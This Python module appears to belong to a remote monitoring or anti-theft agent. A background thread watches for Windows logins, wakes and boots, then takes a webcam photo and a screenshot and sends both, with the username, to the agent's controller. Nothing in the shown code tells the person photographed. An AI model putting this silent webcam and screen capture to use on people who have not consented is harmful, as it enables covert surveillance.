"""Session-side watchdog: login capture (webcam + screenshot + who) and
wake-from-sleep detection via wall-clock jumps."""
import getpass
import threading
import time


def register(ctx):
    def start():
        threading.Thread(target=_watch, args=(ctx,), daemon=True,
                         name="hks-capture-watch").start()
        return {}

    return start()


def _wait_desktop_ready(seconds=6):
    time.sleep(seconds)


def _take_logon_capture(ctx, trigger):
    user = getpass.getuser()
    meta = {"user": user, "trigger": trigger, "ts": time.strftime("%Y-%m-%d %H:%M:%S")}
    # 1) webcam photo (best effort)
    try:
        from . import camera as _cammod  # same opener the live stream uses
        frame = _cammod.capture_still(int(ctx.cfg.get("camera_index", 0)))
        if frame is not None:
            import cv2
            okc, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
            ctx.send_capture("logon_cam", buf.tobytes(), meta)
    except Exception as e:
        ctx.send_error("capture", f"webcam: {e}")
    # 2) screenshot of the new session
    try:
        from .screen import _grab, _jpeg
        im = _grab(1, 1200)
        ctx.send_capture("logon_screen", _jpeg(im, 60), meta)
    except Exception as e:
        ctx.send_error("capture", f"screenshot: {e}")
    ctx.send_event("logon_captured", meta)


def _capture_reason(state):
    reason = state.get("capture_reason")
    if reason in ("login", "wake/resume", "boot"):
        return reason
    try:
        wake_is_newer = float(state.get("last_wake") or 0) >= float(state.get("last_logon_ts") or 0)
    except (TypeError, ValueError):
        wake_is_newer = False
    if wake_is_newer and state.get("last_wake_event_id") == 107:
        return "wake/resume"
    if wake_is_newer and state.get("last_wake_event_id") == 6005:
        return "boot"
    if state.get("last_logon_ts"):
        return "login"
    return None


def _capture_request_key(state):
    reason = _capture_reason(state)
    if reason in ("wake/resume", "boot"):
        stamp = state.get("last_wake") or state.get("capture_requested_at")
    else:
        stamp = state.get("last_logon_ts") or state.get("capture_requested_at") or state.get("last_wake")
    if stamp is not None:
        return f"{reason or 'capture'}:{stamp}"
    return f"{reason or 'user'}:" + str(state.get("last_logon_user") or state.get("console_user") or "unknown")


def _process_pending_capture(ctx, last_request=None):
    """Consume service-side logon requests even when they arrive after startup.

    The service and session agents start independently. The service can detect
    logon after this watcher has already started, so this flag must be polled,
    not read just once during session-agent startup.
    """
    from ..modules.logon_watch import read_state, write_state
    state = read_state()
    if not state.get("capture_needed"):
        return last_request
    reason = _capture_reason(state)
    if reason is None:
        # Ignore legacy/ambiguous wake flags (notably event ID 1, which is a
        # clock change). This keeps old service agents from reopening the
        # webcam repeatedly while they await upgrade/restart.
        request = _capture_request_key(state)
        latest = read_state()
        if latest.get("capture_needed") and _capture_request_key(latest) == request:
            latest["capture_needed"] = False
            write_state(latest)
        return last_request
    request = _capture_request_key(state)
    if request == last_request:
        return last_request
    user = state.get("last_logon_user") or state.get("console_user") or "?"
    trigger = reason
    if trigger == "login":
        trigger = f"login ({user})"
    _take_logon_capture(ctx, trigger)
    # Do not clear a newer request written while the capture was in progress.
    latest = read_state()
    if latest.get("capture_needed") and _capture_request_key(latest) == request:
        latest["capture_needed"] = False
        write_state(latest)
    return request


def _watch(ctx):
    from ..modules.logon_watch import read_state, write_state
    _wait_desktop_ready()
    last_request = _process_pending_capture(ctx)

    # Wake/resume and boot events are signaled by the service agent from
    # Windows System events (IDs 107 and 6005). Wall-clock jump heuristics
    # are intentionally avoided: time synchronization can otherwise look
    # like repeated resumes and continuously reopen the webcam.
    while True:
        time.sleep(5)
        last_request = _process_pending_capture(ctx, last_request)
